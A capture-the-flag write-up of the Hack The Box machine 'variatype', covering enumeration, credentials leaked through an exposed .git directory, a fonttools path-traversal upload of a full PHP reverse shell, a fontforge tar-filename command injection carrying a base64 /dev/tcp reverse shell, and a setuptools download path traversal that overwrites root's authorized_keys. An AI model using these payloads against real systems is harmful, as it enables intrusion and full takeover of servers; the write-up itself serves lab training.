---
layout: post
title: variatype
categories: htb
tags:
- htb
- variatype
- git-dumper
- fonttools
- fontforge
- malicious_server
- setuptools
- directory_traversal
author: nicoliboli
description: enum | fonttools | fontforge | setuptools
date: 2026-07-08 20:57 -0400
---
# enum

```bash
$ nmap 10.129.10.229                          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 21:28 EDT
Nmap scan report for 10.129.10.229
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.16 seconds

$ nmap -sC -sV -p22,80 10.129.10.229          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 21:28 EDT
Nmap scan report for 10.129.10.229
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.10 seconds
```

update `/etc/hosts` to associate the hostname with the ip

```bash
$ cat /etc/hosts                            
[snip]
10.129.10.229     variatype.htb
[snip]
```

## port 80

navigate to `variahtype.htb` in the browser

![variatype_home](/assets/img/variatype_home.png)

selected the `Generate Font` button

![variatype_font](/assets/img/variatype_font.png)

```bash
$ gobuster vhost -u http://variatype.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  --append-domain > tmp

$ cat tmp | cut -d"[" -f 2 | sort
[snip]
Size: 157]
Size: 2494]
[snip]

$ cat tmp | grep 2494            
portal.variatype.htb Status: 200 [Size: 2494]

$ gobuster dir -u http://portal.variatype.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://portal.variatype.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 169] [--> http://portal.variatype.htb/.git/]
/files                (Status: 301) [Size: 169] [--> http://portal.variatype.htb/files/]
Progress: 20481 / 20481 (100.00%)
===============================================================
Finished
===============================================================
```

use `git-dumper` to see if i can dump the `.git` directory

```bash
$ ./py_venv/bin/git-dumper http://portal.variatype.htb/.git ./portal_git 
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[snip]

$ ls -la portal_git     
total 16
drwxrwxr-x 3 kali kali 4096 Mar 15 14:55 .
drwxrwxr-x 4 kali kali 4096 Mar 15 14:54 ..
-rw-rw-r-- 1 kali kali   36 Mar 15 14:55 auth.php
drwxrwxr-x 7 kali kali 4096 Mar 15 14:55 .git
```

now to see what i can uncover with `git`

```bash
$ git status   
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   auth.php

$ git checkout --                           
M       auth.php

$ git log   
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation

$ git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

now there are some creds that can be used to maybe log into the portal: `gitbot:G1tB0t_Acc3ss_2025!`. try them and they work

![variatype_dashboard](/assets/img/variatype_dashboard.png)

# exploit

so with access to this dashboard, i can see what fonts i generated. found [this](https://github.com/advisories/GHSA-768j-98cg-p3fv) vulnerability in `fonttools` that might work.

```python
#!/usr/bin/env python3
import os

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
```

use the above script to generate the two `ttf` files that will be used by the exploit

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
  </axes>
  
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  
  <!-- Filename can be arbitrarily set to any path on the filesystem -->
  <variable-fonts>
    <variable-font name="MaliciousFont" filename="../../..[filepath_to_test]">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

this exploit is broken down into two parts. first, find a file path that i can write to, indicated by the `filepath_to_test`. it took some trial and error to figure out that when a path is valid, a 200 status code is returned and the page indicates that processing has been completed
![variatype_success](/assets/img/variatype_success.png)

else, the response is a 302 and indicates that processing has failed. once i knew how to determine if paths were valid, i came up with a list of likely locations based on the web server being apache and previous htb instances
![variatype_fail](/assets/img/variatype_fail.png)

the following filepaths were tested, though success was does not indicate a usable exploit. the goal is to upload a file to the files directory and access it via the authenticated dashboard

```
success - /tmp
failure - /var/www/html
failure - /var/variatype.htb
failure - /var/www/variatype
success - /opt/variatype

failure - /var/www/portal/files
failure - /var/www/portal/public/files
failure - /var/www/html/portal/files
failure - /var/www/html/portal/public/files

failure - /var/www/portal.htb/files
failure - /var/www/portal.htb/public/files
failure - /var/www/html/portal.htb/files
failure - /var/www/html/portal.htb/public/files

failure - /var/www/variatype.htb/files
failure - /var/www/variatype.htb/public/files
failure - /var/www/html/variatype.htb/files
failure - /var/www/html/variatype.htb/public/files

failure - /var/www/portal.variatype.htb/files
success - /var/www/portal.variatype.htb/public/files
failure - /var/www/html/portal.variatype.htb/files
failure - /var/www/html/portal.variatype.htb/public/files
```

only `/var/www/portal.variatype.htb/public/files` yields a file that can be accessed. now on to part two of the exploit. i put the contents of kali's `php-reverse-shell.php` in `CDATA`, and uploaded the malicious `designspace` file. then i accessed the reverse shell in the `files` directory to get a callback.

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
            <!-- XML injection occurs in labelname elements with CDATA sections -->
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[<?php set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.84'; 
$port = 42069;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>]]]]><![CDATA[>]]></labelname>
            <labelname xml:lang="fr">MEOW2</labelname>
    </axis>
  </axes>
  
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  
  <!-- Filename can be arbitrarily set to any path on the filesystem -->
  <variable-fonts>
          <variable-font name="MaliciousFont" filename="/var/www/portal.variatype.htb/public/files/rev_shell.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

# privesc - steve

in `/opt`, there is a file called `process_client_submissions.bak`. this looks like it could be a script that is used for a cronjob by the user steve based on the directories

```bash
www-data@variatype:/opt$ ls -la
ls -la
total 20
drwxr-xr-x  4 root      root      4096 Mar  9 08:29 .
drwxr-xr-x 18 root      root      4096 Mar  9 08:29 ..
drwxr-xr-x  3 root      root      4096 Mar  9 08:29 font-tools
-rwxr-xr--  1 steve     steve     2018 Feb 26 07:50 process_client_submissions.bak
drwxr-xr-x  4 variatype variatype 4096 Mar  9 08:29 variatype

$ cat process_client_submissions.bak
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```

turns out `fontforge` is riddled with vulns and one that i came across was [CVE-2024-25082](https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/) 

```python
#!/usr/bin/env python3
import tarfile
import os

exec_command = f"$(touch /tmp/poc)"

with tarfile.open("poc.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    t.addfile(tarfile.TarInfo(exec_command))
```

in order to get to the vulnerable code, the file needs to be named appropriately. instead of `poc.tar`, i just duped the filename of a generated font in the directory `/var/www/portal.variatype.htb/public/files` 

```bash
$ cat fontforge_exploit.py 
#!/usr/bin/env python3
import tarfile
import os

exec_command = f"$(touch /tmp/poc)"

with tarfile.open("variabype_mtMUVdTfDl1.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    t.addfile(tarfile.TarInfo(exec_command))

$ python ./fontforge_exploit.py 
                                                                                                
$ ls *.tar
variabype_mtMUVdTfDl1.tar
```

transfer the file to the target in the `files` directory and wait a couple minutes. the `poc` file should appear in `tmp` and is owned by the user `steve`

```bash
$ ls -la /tmp/poc
ls -la /tmp/poc
-rw-r--r-- 1 steve steve 0 Mar 16 19:42 /tmp/poc
```

now for code execution. the command has to be compatible with a filename, so the first thing i thought of was to base64 encode a shell and use pipes to decode and execute it

```bash
$ echo -n "sh -i >& /dev/tcp/10.10.14.84/42070 0>&1" | base64                   
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODQvNDIwNzAgMD4mMQ==

$ cat fontforge_exploit.py 
#!/usr/bin/env python3
import tarfile
import os

exec_command = f"$(echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODQvNDIwNzAgMD4mMQ=='|base64 -d|bash)"

with tarfile.open("variabype_mtMUVdTfDl1.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    t.addfile(tarfile.TarInfo(exec_command))

$ python ./fontforge_exploit.py 
                                                                                                
$ ls *.tar
variabype_mtMUVdTfDl1.tar
```

once again wait a couple minutes (unless you get lucky with your timing) and get a shell

# privesc - root

ran `linpeas` and found a possible exploit

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                   
Matching Defaults entries for steve on variatype:                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

look at the file

```python
#!/usr/bin/env python3
"""
Font Validator Plugin Installer
--------------------------------
Allows typography operators to install validation plugins
developed by external designers. These plugins must be simple
Python modules containing a validate_font() function.

Example usage:
  sudo /opt/font-tools/install_validator.py https://designer.example.com/plugins/woff2-check.py
"""

import os
import sys
import re
import logging
from urllib.parse import urlparse
from setuptools.package_index import PackageIndex

# Configuration
PLUGIN_DIR = "/opt/font-tools/validators"
LOG_FILE = "/var/log/font-validator-install.log"

# Set up logging
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc])
    except Exception:
        return False

def install_validator_plugin(plugin_url):
    if not os.path.exists(PLUGIN_DIR):
        os.makedirs(PLUGIN_DIR, mode=0o755)

    logging.info(f"Attempting to install plugin from: {plugin_url}")

    index = PackageIndex()
    try:
        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
        logging.info(f"Plugin installed at: {downloaded_path}")
        print("[+] Plugin installed successfully.")
    except Exception as e:
        logging.error(f"Failed to install plugin: {e}")
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Usage: sudo /opt/font-tools/install_validator.py <PLUGIN_URL>")
        print("Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py")
        sys.exit(1)

    plugin_url = sys.argv[1]

    if not is_valid_url(plugin_url):
        print("[-] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    if plugin_url.count('/') > 10:
        print("[-] Suspiciously long URL. Aborting.")
        sys.exit(1)

    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```

after a quick google found [this](https://security.snyk.io/vuln/SNYK-PYTHON-SETUPTOOLS-9964606) vulnerability

## debugging

i found a couple exploits that could possibly work that revolved around python's `PackageIndex` not sanatizing data correctly. i decided to setup an environment that i could actually look at the vulnerable code, so downloaded the unpatched `setuptools` and the version of `urllib` used by the system. now there could be a chance that root has different package versions installed, so i will keep that in mind. also i only installed those versions for the two packages because of the imports in the python file 

```bash
steve@variatype:/opt/font-tools$ pip list
Package            Version
------------------ ---------
blinker            1.9.0
certifi            2022.9.24
chardet            5.1.0
charset-normalizer 3.0.1
click              8.3.1
Flask              3.1.2
fonttools          4.50.0
httplib2           0.20.4
idna               3.3
itsdangerous       2.2.0
Jinja2             3.1.6
MarkupSafe         3.0.3
pip                23.0.1
pycurl             7.45.2
pyparsing          3.0.9
PySimpleSOAP       1.16.2
python-apt         2.6.0
python-debian      0.1.49
python-debianbts   4.0.1
reportbug          12.0.0
requests           2.28.1
setuptools         78.1.0
six                1.16.0
urllib3            1.26.12
Werkzeug           3.1.4
wheel              0.38.4
```

```bash
$ ./py_venv/bin/pip3 install setuptools==78.1.0

$ ../py_venv/bin/pip3 install urllib3==1.26.12
[snip]      
Successfully installed urllib3-1.26.12                                                          
                                                                                                
$ ../py_venv/bin/pip3 list                    
Package            Version
------------------ ---------
[snip]
setuptools         78.1.0
[snip]
urllib3            1.26.12
```


## on target

had to find a way to host only one file and redirect any GET requests to that file. this way i can use a malicious payload and don't have to worry about hosting that file

```bash
$ cat server.py          
import http.server
import socketserver

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.path="/test.txt"

        # only serve file i want
        super().do_GET()

# Example server setup
PORT = 8000
with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
```

now i need to run the command on target with the malicious args that will perform an arbitrary write.

```bash
steve@variatype:/opt/font-tools$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.84:8000/%2ftmp%2ftest
2026-03-17 09:39:47,291 [INFO] Attempting to install plugin from: http://10.10.14.84:8000/%2ftmp%2ftest
2026-03-17 09:39:47,300 [INFO] Downloading http://10.10.14.84:8000/%2ftmp%2ftest
2026-03-17 09:39:47,615 [INFO] Plugin installed at: /tmp/test
[+] Plugin installed successfully.

steve@variatype:/opt/font-tools$ cat /tmp/test 
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.9
Date: Tue, 17 Mar 2026 13:39:46 GMT
Content-type: text/plain
Content-Length: 8
Last-Modified: Tue, 17 Mar 2026 13:39:11 GMT

testing

steve@variatype:/opt/font-tools$ ls -la /tmp/test
-rw-r--r-- 1 root root 193 Mar 17 09:39 /tmp/test
```

so now we can overwrite root's ssh public key in `authorized_keys` and login with our private key

```bash
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/htb/variatype/setuptools_exploit/payloads/authorized_keys
Enter passphrase for "/home/kali/htb/variatype/setuptools_exploit/payloads/authorized_keys" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/htb/variatype/setuptools_exploit/payloads/authorized_keys
Your public key has been saved in /home/kali/htb/variatype/setuptools_exploit/payloads/authorized_keys.pub
The key fingerprint is:
SHA256:YBYUpiLACKSG0vprKVaDsFOEjxcSTxuGA+V7K0+6qH8 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|@*=  .=.         |
|XBoo o .         |
|=B*.. +          |
|=o+o o .         |
|o+o .   S        |
|oo + .           |
| .+.+            |
|.oo*E            |
|=+=o.            |
+----[SHA256]-----+

$ cat authorized_keys.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDU29DS2tb0OhnB+Y/CrmoFLjG1+1HgtJDkzgAOTnESU2ZTJNZvttT+PAss/+1Hib1p2d3MvRPZnJDt8bfATR4K9q9un4R1x6z1s3CIfSoJow1bHcxiWedYJvViPVmGm4MKnNXHN3LDikPDU1PtN7s4c7iwxkFkzSod1G5TWn4fM5Br2wKwag18z8k6h3neMkKDomGTr7IcbeWBSHhjIBz5M6tpNClicMmAaUeKmuyIwC9C6D/iKVSHbmg6aEom2YvaDBDd4Nk6nAapxuZvdhYoOyVh8bMKpOzMSgKtUi5mA0D0HYNtlYOBn3VgMemzJJHmLnMIRD0Rx98qYYvjQ7T6HuFVTi+q1RfXPCbUtCSdlf3bKXWRZh03xL77gh54inSC4Mmj37GMZXyyj139XkcKpxrKuL3SmDmJ+jmAadXFZlKi+jfen6isg26ZL6FzViZpaRT9TfoDn8kOCjKxxI74BPRNosxvZKxYvMGgghO3V7UX+u/YJTuU2Ysam2i/QLE=

$ python3 ./server.py
Serving at port 8000
```

```bash
steve@variatype:/opt/font-tools$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.84:8000/%2froot%2f.ssh%2fauthorized_keys
2026-03-17 09:47:41,354 [INFO] Attempting to install plugin from: http://10.10.14.84:8000/%2froot%2f.ssh%2fauthorized_keys
2026-03-17 09:47:41,362 [INFO] Downloading http://10.10.14.84:8000/%2froot%2f.ssh%2fauthorized_keys
2026-03-17 09:47:41,868 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

```bash
$ chmod 600 ./authorized_keys

$ ssh -i ./authorized_keys root@variatype.htb
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 17 09:49:34 2026 from 10.10.14.84
root@variatype:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:a9:2a brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.10.229/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2458sec preferred_lft 2458sec
root@variatype:~# cat root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxd5c2
```